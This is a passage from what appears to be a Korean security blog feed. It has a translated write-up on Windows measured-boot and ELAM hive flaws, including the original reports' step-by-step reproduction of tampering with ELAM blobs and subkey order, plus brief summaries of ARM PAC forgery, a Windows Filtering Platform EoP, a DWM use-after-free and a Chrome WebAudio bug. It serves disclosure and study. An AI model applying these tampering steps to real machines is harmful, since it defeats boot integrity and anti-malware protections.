Loader에서 이러한 레지스트리 값을 읽을 필요가 없었으므로 Big Data Record 케이스를 지원하지 않는 레거시 코드로 인해 발생했다.</p><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에서 Big Data Record 케이스에 대한 지원을 구현하여 취약점을 수정했다. 해당 취약점은 ELAM blob의 임계값인 16344 bytes에 도달하지 않는 ELAM 드라이버에는 영향을 주지 않는다. </p><h3 id="Original-vulnerability-report"><a href="#Original-vulnerability-report" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryWhen an ELAM driver stores a binary larger than 16344 bytes in one of three measured values (called &quot;Measured&quot;, &quot;Policy&quot;, or &quot;Config&quot;) within the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), this binary isn&#x27;t measured correctly by the Windows loader (winload.exe or winload.efi).Under specific conditions, a modification made to an ELAM blob won&#x27;t result in different PCR values, thus not affecting the measured boot (since PCR values are equal to the expected ones).# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.<span class="hljs-number">2.</span> Add a <span class="hljs-keyword">new</span> key under the root of the ELAM hive. Assign a <span class="hljs-keyword">new</span> value to <span class="hljs-keyword">this</span> key (in <span class="hljs-keyword">this</span> report, the value will be called <span class="hljs-string">&quot;Measured&quot;</span>).<span class="hljs-number">3.</span> Write more than <span class="hljs-number">16344</span> bytes of data to that value (see: <span class="hljs-string">&quot;01-elam-blob.png&quot;</span>).<span class="hljs-number">4.</span> Unmount the ELAM hive.<span class="hljs-number">5.</span> Reboot the system.<span class="hljs-number">6.</span> During the boot, the Windows loader measures data starting from the beginning of the CM_BIG_DATA structure as pointed by the CM_KEY_VALUE structure describing the <span class="hljs-string">&quot;Measured&quot;</span> value (see: <span class="hljs-string">&quot;02-elam-blob-measured.png&quot;</span>).    Since the expected data length is larger than the CM_BIG_DATA structure, subsequent bytes of the hive file (actually, from the memory region used to store the hive file loaded) are included into the measurement (instead of actual value data).<span class="hljs-number">7.</span> After the boot, change (<span class="hljs-keyword">using</span> a registry editor) several bytes within the value data, without altering the data size (see: <span class="hljs-string">&quot;03-elam-blob-altered.png&quot;</span>).<span class="hljs-number">8.</span> Reboot the system.<span class="hljs-number">9.</span> During the boot, the Windows loader will see the same CM_BIG_DATA structure <span class="hljs-keyword">and</span> subsequent bytes as value data (see: <span class="hljs-string">&quot;04-elam-blob-altered-measured.png&quot;</span>).## Root causeThe Windows loader doesn<span class="hljs-number">&#x27;</span>t support parsing value data stored <span class="hljs-keyword">using</span> the CM_BIG_DATA structure. This structure is used when the hive format version is <span class="hljs-number">1.4</span> <span class="hljs-keyword">or</span> newer <span class="hljs-keyword">and</span> value data to be stored is larger than <span class="hljs-number">16344</span> bytes.The ELAM hive uses the format version <span class="hljs-number">1.5</span>. Thus, the CM_BIG_DATA structure is supported in the NT kernel, but <span class="hljs-keyword">not</span> in the Windows loader.The OslGetBinaryValue routine (in the Windows loader) provides back a pointer to cell data containing the CM_BIG_DATA structure instead of parsing <span class="hljs-keyword">this</span> <span class="hljs-keyword">and</span> related structures <span class="hljs-keyword">and</span> then providing a pointer to consolidated data segments.## Attack scenariosFirst, ELAM blobs larger than <span class="hljs-number">16344</span> bytes aren<span class="hljs-number">&#x27;</span>t measured correctly. This is a serious security issue by itself.Finally, <span class="hljs-keyword">if</span> an ELAM driver uses existing measured ELAM blobs larger than <span class="hljs-number">16344</span> bytes, a malicious usermode program could alter (corrupt <span class="hljs-keyword">or</span> downgrade) these blobs without affecting the measured boot.Such an attack is possible when:* a <span class="hljs-built_in">list</span> of cells containing value data segments is stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* such value data segments are stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* a <span class="hljs-built_in">list</span> of cells containing value data segments <span class="hljs-keyword">and</span> such value data segments are all stored after the CM_BIG_DATA structure, but there is a large gap after the CM_BIG_DATA structure   (which isn<span class="hljs-number">&#x27;</span>t smaller than the defined value data size, so the hash calculation won<span class="hljs-number">&#x27;</span>t reach the actual value data, <span class="hljs-keyword">or</span> it<span class="hljs-number">&#x27;</span>s smaller than that, but the hash calculation doesn<span class="hljs-number">&#x27;</span>t reach the modified bytes of actual value data).Under any specific condition defined above, changing offsets to value data segments <span class="hljs-keyword">or</span> changing value data segments respectively won<span class="hljs-number">&#x27;</span>t be noticed during the measurement. (Since the hash is calculated over the internals of the hive file, but <span class="hljs-keyword">not</span> over the actual value data.)Since the ELAM hive isn<span class="hljs-number">&#x27;</span>t loaded after the boot, a malicious usermode program can open it <span class="hljs-keyword">and</span> alter its data in any way possible (<span class="hljs-keyword">this</span> is <span class="hljs-keyword">not</span> limited to registry functions exposed by the Advapi32 library, the hive file can be opened <span class="hljs-keyword">and</span> edited in a HEX editor), thus exploiting any pre-existing condition defined above.## Possible solutionHandle the CM_BIG_DATA structure when parsing a registry value <span class="hljs-keyword">using</span> the Windows loader.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2013.png" alt="measured-boot-vuln/Untitled%2013.png"></p><blockquote><p>01-elam-blob.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2014.png" alt="measured-boot-vuln/Untitled%2014.png"></p><blockquote><p>02-elam-blob-measured.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2015.png" alt="measured-boot-vuln/Untitled%2015.png"></p><blockquote><p>03-elam-blob-altered.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2016.png" alt="measured-boot-vuln/Untitled%2016.png"></p><blockquote><p>04-elam-blob-altered-measured.png</p></blockquote><h2 id="CVE-2021–27094"><a href="#CVE-2021–27094" class="headerlink" title="CVE-2021–27094"></a>CVE-2021–27094</h2><p>이 취약점은 앞서 소개된 취약점보다 조금 복잡하다.<br>Windows Loader 또는 Windows Kernel에서는 하이브를 로드할 때 형식 위반이 있는지 확인한다. 이 검사는 Windows Loader에 의해 로드된 하이브에 대해 두 번 수행한 뒤 메모리의 Windows Kernel로 전달된다 (ELAM 하이브 포함).</p><p>이 검사 로직은 Windwos Loader와 Kernel이 유사하게 구현되었지만 차이점이 존재한다. 그중 하나가 Windows Loader는 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않는다는 것이다.</p><p>ELAM 하이브는 Windows Kernel에 의해 시작된 ELAM 드라이버에서 사용되므로 Windows Loader의 ELAM blob 측정과 ELAM 드라이버 사용 사이의 사전 순 정렬 검사가 삽입된다. Windows Loader에서 측정한 후 ELAM 드라이버에서 사용하기 전 ELAM blob을 포함하는 레지스트리 키를 임의 삭제하기 위해 이 검사 프로세스의 취약점을 이용할 수 있다.</p><p>공격자는 하이브를 마운트 한 다음 표준 API를 호출해 루트 키 아래에 있는 ELAM 하이브에 빈(값이 없는) 키를 삽입할 수 있다. 그리고 Windows Kernel이 측정된 ELAM blob이 존재하는 키를 삭제하도록 유도해야 하는데, 이는 공격자가 키 삽입 후 하이브의 마운트를 해제하고 HEX 편집기로 하이브 파일의 키 목록의 순서를 임의로 변경해 사전 순 정렬을 깨는 것으로 달성할 수 있다. </p><blockquote><p>역자:<br>하이브 마운트 → 표준 API로 빈 키 생성 → 마운트 해제 → 하이브 파일의 키 순서 변경<br>으로 나타낼 수 있습니다.</p></blockquote><br>위 설명의 예시는 아래 ELAM 하이브의 레이아웃을 살펴보면 이해가 쉽다.<ol><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li><li>Key: zz<ul><li>No values</li></ul></li></ol><blockquote><p>키 순서는 루트 키의 하위 키 목록에있는 키 노드 오프셋 순서를 반영</p></blockquote><p>위는 표준 API 호출을 사용해 “zz” 키를 삽입한 정상적인 레이아웃이다. 공격자는 원하는 다음 레이아웃을 얻기 위해 하위 키 목록을 수정해야 한다.</p><ol><li>Key: zz<ul><li>No values</li></ul></li><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li></ol><blockquote><p>하위 키 목록에서 두 요소의 순서를 반대로하면 취약점을 트리거할 수 있다.</p></blockquote><br>이제 사전 순 정렬이 깨졌다. <pre><code class="hljs c">Upcase(<span class="hljs-string">&quot;zz&quot;</span>) &gt; Upcase(<span class="hljs-string">&quot;Windows Defender&quot;</span>)</code></pre><p>Windows Kernel은 사전 순 정렬이 깨졌으므로 ELAM 드라이버에서 사용하기 전에 “Windows Defender”키를 삭제한다. 그러나 Windows Loader는 이러한 손상을 인식하지 못하고, 측정할 값이 없는 “zz”키를 건너뛰어 이미 삭제된 “Windows Defender” 키에 있는 “Measured”값을 측정한다. </p><p>결과적으로 이는 ELAM blob이 ELAM 드라이버가 실행되기 전에 삭제될 수 있음을 보여준다.</p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>이 취약점은 Windows Loader가 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않기 때문에 발생한다.</p><p>유니코드 형식의 키 이름이 허용되고, Windows Loader에는 적절한 대소문자 테이블(문자를 대문자로 변환하는 데 사용되는 테이블)이 없어 대소문자를 구분하지 않는 사전 순 정렬을 수행하지 못한다. 따라서 Windows Loader의 해당 기능이 의도적으로 제거된 것이 취약점이 발생한 원인이 되었다.</p><p>유니 코드 대문자 테이블은 Windows Kernel에서 사용되기 때문에 사전 순 정렬은 Kernel에서 구현되었다. 또한 Loader에서 완화된 검사로 인해 Kernel 이전에 로드된 하이브에 대한 검사까지 두 번 수행해야 한다.<br>흥미롭게도, 현재 구현으로는 유니 코드 문자에 대해 리팩토링 할 수 있지만 NLS 테이블을 로드하기 전에 SYSTEM 하이브를 로드해야 한다. </p><h3 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에 사전 순 정렬 검사를 도입하여 취약점을 패치했다. 유니 코드 대문자 테이블은 Windows Loader에서 사용되지 않으므로 ASCII 문자를 사용하는 키 이름으로만 제한된다. 현재 키 이름에 ASCII 문자 외의 형식을 사용하는 ELAM 드라이버는 없는 것으로 확인된다.</p><p>이러한 패치는 SYSTEM 하이브를 검사할 때 심각한 데이터 손상 문제의 원인이 된다. SYSTEM 하이브는 ELAM 하이브와 마찬가지로 초기 부팅 중에 로드되나 ASCII 문자 외 형식의 키를 포함할 수 있다.</p><p>Windows Loader의 유니코드 비교 함수는 유니코드 대문자 테이블을 사용하지 않기 때문에 ASCII 외의 문자를 확인할 수 있는 방법이 없다. 아래 코드는 Windows Kernel에서 두 개의 키 이름 (대소 문자 구분 없음)을 비교하는 데 사용된다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2017.png" alt="measured-boot-vuln/Untitled%2017.png"></p><blockquote><p>유니 코드 문자열을 비교하는 데 사용되는 함수</p></blockquote><p>코드를 보면 알 수 있듯이 “z”(“a”+ 0x19) 보다 높은 코드를 가진 문자의 경우 변환이 수행되지 않는다. 예를 들어 해당 코드에서는 “я”의 대문자 버전은 “Я”이 아니라 “я”이 된다.</p><p>Windows Kernel에서 구현된 동일한 함수는 유니 코드 대문자 테이블을 사용하므로 “я”의 대문자 버전은 “Я”로 정상적으로 변환이 된다. SYSTEM 하이브 내의 하위 키 목록에 있는 요소는 이에 따라 정렬되나 부팅하는 동안에는 Windows Loader의 함수를 사용하여 확인한다.</p><p>따라서 Windows Loader는 올바르게 정렬된 하위 키 목록을 손상된 것으로 간주해 레지스트리 키를 삭제한다.</p><p>해당 이슈를 재현하려면 동일한 상위 레지스트리 키 아래의 SYSTEM 하이브에서 이름이 “я1”및 “Я2”인 두 개의 레지스트리 키를 만든 다음 컴퓨터를 재부팅하면 된다.  Windows Kernel에서는 하위 키 목록이 다음과 같이 정렬된다.</p><ol><li><em>я1</em></li><li><em>Я2</em></li></ol><p>Windows Loader에서는 아래와 같이 인식한다. Loader는 이러한 정렬을 손상된 것으로 인식해 부팅 후 “Я2”키가 삭제되는 것을 확인할 수 있다.</p><pre><code class="hljs c">Upcase (<span class="hljs-string">&quot;я1&quot;</span>)&gt; Upcase (<span class="hljs-string">&quot;Я2&quot;</span>), Upcase (<span class="hljs-string">&quot;я1&quot;</span>) = <span class="hljs-string">&quot;я1&quot;</span></code></pre><p>Microsoft는 취약점을 확인했지만 범위를 벗어났다는 이유로 업데이트하지 않았다.</p><h3 id="Original-vulnerability-report-1"><a href="#Original-vulnerability-report-1" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryA malicious usermode program can modify the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), so its blobs (registry values called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;) are correctly measured on the next boot, but the ELAM driver won&#x27;t see them because registry keys containing these blobs are deleted by the NT kernel (even before the BOOT_DRIVER_CALLBACK_FUNCTION callback is registered). This results in proper (expected) PCR values but registry values (the ones previously measured) are absent when the ELAM driver tries to read them. So, the system will boot without proper ELAM signatures and this won&#x27;t affect the measured boot.# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.2. Add the &quot;zz&quot; key under the root key of the ELAM hive, don&#x27;t assign any values to this key (see: &quot;01-regedit.png&quot;).<span class="hljs-number">3.</span> Unmount the ELAM hive.4. Open the ELAM hive file in a HEX editor (you can open it because it&#x27;s not loaded), locate the subkeys list (subkeys of the root key), move the &quot;zz&quot; key to the first position on that list. (A key that was the first one before the move should now occupy the second position on the list. If there are three subkeys, just exchange the first and last keys on the list.)The idea is to <span class="hljs-keyword">break</span> the lexicographical order of subkeys. So, <span class="hljs-string">&quot;1 2&quot;</span> becomes <span class="hljs-string">&quot;2 1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;1 2 3&quot;</span> becomes <span class="hljs-string">&quot;3 2 1&quot;</span> (see: <span class="hljs-string">&quot;02-hexeditor-intact.png&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;03-hexeditor-modified.png&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;before&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;after&quot;</span> states of the hive file respectively).<span class="hljs-number">5.</span> Reboot the system.6. When the Windows loader (winload.exe or winload.efi) reads the ELAM hive, it doesn&#x27;t check the lexicographical order of subkeys (see: &quot;04-leaf-as-loaded-by-winload.png&quot;). It&#x27;s okay for the Windows loader if subkeys are stored in a wrong order.7. When the Windows loader measures the ELAM hive (in the OslpMeasureEarlyLaunchHive routine), it reads subkeys one-by-one and measures their values (called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;).8. If you manage to break the lexicographical order of subkeys by inserting empty keys and keeping real (non-empty) keys in the same order (relative to each other, not counting the empty keys), then the Windows loader will measure the usual (expected) data. This can be easily demonstrated with one key – &quot;Windows Defender&quot;. If you insert the <span class="hljs-string">&quot;zz&quot;</span> key <span class="hljs-keyword">using</span> a registry editor, it goes to the end of the subkeys <span class="hljs-built_in">list</span>. Like <span class="hljs-keyword">this</span>:- Windows Defender- zzIf you move the &quot;zz&quot; key to the top (using a HEX editor), the lexicographical order is broken, but since the &quot;zz&quot; key has no values, it doesn&#x27;t get measured. And the &quot;Windows Defender&quot; is measured as usual.9. When the NT kernel starts, it takes hives attached to the loader parameter block and validates them. At this point, the validation routine checks the lexicographical order. If a subkeys list isn&#x27;t sorted, offending keys are removed from the list (see: &quot;05-leaf-as-loaded-by-kernel.png&quot;, &quot;06-leaf-as-loaded-by-kernel.png&quot;, and &quot;07-leaf-after-check-by-kernel.png&quot;). This means that the <span class="hljs-string">&quot;Windows Defender&quot;</span> key from the example above is removed.10. When the ELAM driver tries to locate its signatures, they are gone – they were removed by the NT kernel because of the hive format violation (see: &quot;08-leaf-as-seen-by-elam.png&quot;).## Possible solutionsEither check the lexicographical order of subkeys in the Windows loader (which requires you to pick the NLS tables first) or measure empty keys together with non-empty ones.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2018.png" alt="measured-boot-vuln/Untitled%2018.png"></p><blockquote><p>01-regedit.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2019.png" alt="measured-boot-vuln/Untitled%2019.png"></p><blockquote><p>02-hexeditor-intact.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2020.png" alt="measured-boot-vuln/Untitled%2020.png"></p><blockquote><p>03-hexeditor-modified.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2021.png" alt="measured-boot-vuln/Untitled%2021.png"></p><blockquote><p>04-leaf-as-loaded-by-winload.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2022.png" alt="measured-boot-vuln/Untitled%2022.png"></p><blockquote><p>05-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2023.png" alt="measured-boot-vuln/Untitled%2023.png"></p><blockquote><p>06-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2024.png" alt="measured-boot-vuln/Untitled%2024.png"></p><blockquote><p>07-leaf-after-check-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2025.png" alt="measured-boot-vuln/Untitled%2025.png"></p><blockquote><p>08-leaf-as-seen-by-elam.png</p></blockquote><hr>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>malware</tag>
      
      <tag>L0ch</tag>
      
      <tag>boot security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PAC와 PAC Forgery</title>
    <link href="/2021/06/27/j0ker/2021-06-27/"/>
    <url>/2021/06/27/j0ker/2021-06-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/">https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/</a> </p></li><li><p><a href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&gt; ARMv8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fabu1ous님이 말도 없이 제가 하루한줄로 쓰려던 주제를 어제 써버리는 바람에… 오늘은 <code>PAC</code>와 <code>PAC Forgery</code>에 대해서 간단하게 알아보도록 하겠습니다.</p><p><code>PAC</code>는 <code>Pointer Authentication Code</code>의 약자로, 말 그대로 포인터들을 인증하는 미티게이션 기법입니다. <code>ARMv8.3-A</code>부터 지원하며 iOS에서 이 미티게이션을 지원하면서 익스플로잇 난이도가 많이 올라갔다고 합니다.</p><blockquote><p>예… 저는 안해봐서 얼마나 어려운지 모르겠네요…?</p></blockquote><p>안드로이드에서도 지원을 하는지 여부는 제대로 확인을 못해봤습니다. <code>ARMv9</code>로 나오는 Cortex CPU에서 <code>PAC</code>를 지원하는 <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/first-armv9-cpu-cores">기사</a>를 봤는데, 혹시 아시는 분이 있으면 댓글 달아주세요 ㅜㅜ</p><p><code>PAC</code>가 동작하는 방식은 매우 “간단”합니다.</p><p>먼저, pac로 시작하는 명령어(ex. <code>paciasp</code>, <code>pacia</code>)를 통해 context와 key 그리고 해당 포인터를 이용해 sign을 합니다. 이 때, key는 128비트 값이며 시스템 레지스터에 저장되어 있는데, 일단 유저 권한에서는 당연히 접근할 수 없습니다. context는 64비트 값을 사용합니다. <code>paciasp</code>를 사용하여 PAC를 생성할 경우, 스택 포인터를 사용합니다.(<code>paciasp</code>의 맨뒤가 sp인 이유)</p><p>그리고 이 세 개의 값은 특정 알고리즘으로 계산되어 PAC를 생성할 수 있는데, 기본적으로 <a href="https://eprint.iacr.org/2016/444.pdf">QARMA</a>를 사용하고 CPU 제조사마다 커스텀이 가능합니다. 이렇게 생성된 <code>PAC</code>는 sign하려고 한 포인터의 상위 주소에 저장됩니다.</p><p>Sign한 뒤, 해당 포인터를 사용할 때에는 먼저 aut로 시작하는 명령어를 사용하여 해당 포인터가 변조되었는지를 확인합니다. 똑같이 포인터 값과 context 그리고 key 값을 사용해 해당 포인터가 정상인지를 검증합니다. 따라서 userspace에서는 <code>PAC</code>생성 알고리즘에서 사용하는 key와 context뿐만 아니라 <code>PAC</code>를 생성하는 알고리즘을 알고 있어야만 알고리즘에 부합하는 값을 얻어낼 수 있습니다.</p><p><code>PAC Forgery</code>는 key와 알고리즘 없이 이를 우회하는 기법입니다.</p><p>첫 번째 블로그의 예시 문제에서는 간단한 버퍼 오버플로우를 통해 <code>LR</code>을 조작할 수 있습니다. 이 문제는 ASLR이 걸려있지 않기 때문에 PAC 생성에 사용되는 스택 주소는 디버깅을 통해 알 수 있습니다.</p><p>그리고 <code>sign_contract()</code>함수를 살펴보면 <code>pacia</code> 명령어를 이용해 특정 레지스터에 대한 PAC를 생성합니다. 이처럼 사용자가 활용할 수 있는 <code>pacia</code> 명령어가 존재하고 context를 알고 있다면 원하는 <code>PAC</code> 코드를 생성할 수 있습니다. 그러면 이런 기능을 활용하여 점프하고 싶은 주소에 대한 <code>PAC</code> 코드를 생성하고 <code>LR</code>에 넣으면 원하는 주소로 점프하여 익스플로잇을 할 수 있게 됩니다.</p><p>다만, 해당 예시 문제는 <code>pacia</code>를 자유롭게 활용할 수 있는 상황이고 <code>ASLR</code>이 안 걸려 있어 익스플로잇하기 매우 쉬운 상황입니다. 리얼월드에서는 기본적으로 <code>information leak</code> 취약점과 pac 명령어들을 활용하는 취약점이 있어야하기 때문에 기본적으로 두개의 취약점을 가지고 있어야 익스플로잇을 해볼 수 있습니다. 이래서 어려운건지 모르겠네요. 언젠가는 제가 직접 익스플로잇을 해보면서 이에 대해 설명하는 글을 써보도록 하겠습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>bypass</tag>
      
      <tag>arm64</tag>
      
      <tag>pac</tag>
      
      <tag>pointer authentication</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31970: Windows Filtering Platform EoP</title>
    <link href="/2021/06/26/fabu1ous/2021-06-26/"/>
    <url>/2021/06/26/fabu1ous/2021-06-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2175">Windows Filtering Platform Token Access Check EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Filtering Platform(WFP)의 TCP/IP 드라이버는 token impersonation level에 대한 검증 미흡으로 발생하는 방화벽 정책 우회 및 권한상승 취약점이 패치되었습니다. </p><p>WFP는 네트워크 필터링을 생성하기 위한 API 및 시스템 서비스들입니다. 소캣에 작업이 들어오면 기본 필터링 엔진 및 Windows 방화벽에서 구성한 정책에 따라 작업이 허용되는지 확인하는데 그 필터링 정책은 호출자의 토큰 상태에 따라 달라집니다. 하지만 이 정책들을 다음과 같은 문제로 인해 우회할 수 있습니다.</p><ul><li><p>PsReferenceImpersonationToken을 호출해 토큰을 TOKEN_ACCESS_INFORMATION 구조체로 변환할 때 impersonation level이 SecurityImpersonation 이상인지 확인하지 않습니다.</p></li><li><p>TCP/IP 드라이버는 토큰 impersonating 도중에 소캣 생성을 허용합니다.</p></li></ul><p>일반 사용자가 시스템 토큰을 캡처하고 impersonat 할 수 있게 되므로 해커는 이를 악용해 방화벽 정책에 의해 명시적으로 허용되지 않는 작업을 수행할 수 있게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>tcpip</tag>
      
      <tag>wfp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33739: Microsoft DWM core library의 권한 상승 취약점</title>
    <link href="/2021/06/25/l0ch/2021-06-25/"/>
    <url>/2021/06/25/l0ch/2021-06-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg">https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 21H1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://ko.wikipedia.org/wiki/%EB%8D%B0%EC%8A%A4%ED%81%AC%ED%86%B1_%EC%B0%BD_%EA%B4%80%EB%A6%AC%EC%9E%90">Windows 데스크톱 창 관리자</a>(Desktop Window Manager, dwm.exe)의 <code>dwmcore.dll</code> 모듈에서 UAF로 인한 권한 상승 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p><code>dwmcore.dll</code> 모듈의 <code>CinteractionTrackerBindingManager</code> 객체는 참조 횟수(reference count)를 기준으로 해제 시점이 결정됩니다. 객체를 바인딩하는 경우<code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수를 사용하고 참조 횟수가 1 증가하며, 바인딩 해제하는 경우 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수를 사용하며 참조 횟수가 1 감소합니다. 참조 횟수가 0이 된 객체는 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p><p>취약점은 같은 객체를 바인딩하는 리소스가 <code>CinteractionTrackerBindingManager</code> 객체를 참조했을 때 발생하며 해커가 DirectComposition API를 사용해 코드 수준에서 트리거가 가능합니다.</p><ol><li><p>동일한 <code>CinteractionTrackerMarshaler</code>를 바인딩하는 두 개의 리소스가 <code>CinteractionTrackerBindingManager</code>을 참조합니다.</p></li><li><p><code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수는 동일한 <code>CinteractionTrackerMarshaler</code>에 대해 한 번만 호출되어 참조 횟수는 1 증가합니다.</p></li><li><p>리소스의 사용이 종료되고 해제될 때 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수는 각각의 리소스에 대해 두 번 호출됩니다.</p><ul><li><p>첫 호출 시 <code>CinteractionTrackerBindingManager</code> 객체의 참조 횟수가 1 감소합니다. 0이 된 경우 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p></li><li><p>두 번째 호출 시 해제된 <code>CinteractionTrackerBindingManager</code> 객체에 접근하게 되어 UAF가 트리거 됩니다.</p></li></ul></li></ol><p>공개된 PoC는 <a href="https://github.com/mavillon1/CVE-2021-33739-POC">https://github.com/mavillon1/CVE-2021-33739-POC</a> 에서 확인할 수 있으며  <code>dwmcore.dll</code> 에서는 지난 4월 <a href="https://hackyboiz.github.io/2021/04/15/idioth/2021-04-15/">out of bounds write 취약점(CVE-2021-28310)</a>이 공개되기도 했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>local privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30522: Google Chrome WebAudio Code Execution Vulnerability</title>
    <link href="/2021/06/24/idioth/2021-06-24/"/>
    <url>/2021/06/24/idioth/2021-06-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/06/chrome-web-audio.html">Vulnerability Spotlight: Code execution vulnerability in Google Web Audio API</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google Chrome 88.0.4324.146 (Official version) (64-bit)</li><li>Google Chrome 90.0.4405.0 (Build) (64-bit)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome의 WebAudio <code>blink::AudioNodeOutput::Pull</code>에서 use after-free를 통한 code execution 취약점이 발견되었습니다. 조작된 웹 사이트에 접속하면 취약점이 트리거 되어 코드가 실행됩니다.</p><p>해당 취약점은 <code>blink::AudioNodeOutput::Pull</code> 함수에서 이미 초기화 된 메모리 영역인 <code>in_place_bus</code> (AudioBus 포인터)를 제공받아 발생합니다. WebAudio <code>createGain()</code>이 호출되면 AudioNode 객체 등이 할당되어 출력에 연결됩니다. AudioNode 인터페이스의 <code>connect()</code> 메서드는 노드의 출력 중 하나를 타깃에게 연결합니다. 루프에서 <code>new Float32Array/Uint8Array</code>를 사용하여 인접한 메모리를 연속해서 할당하며 이로 인해 garbage collector가 강제적으로 작동합니다. garbage collection이 수행되는 동안 audio rendering thread는 이미 해제된 AudioNode (AudioOutput)을 참조하므로 use after-free가 발생하며 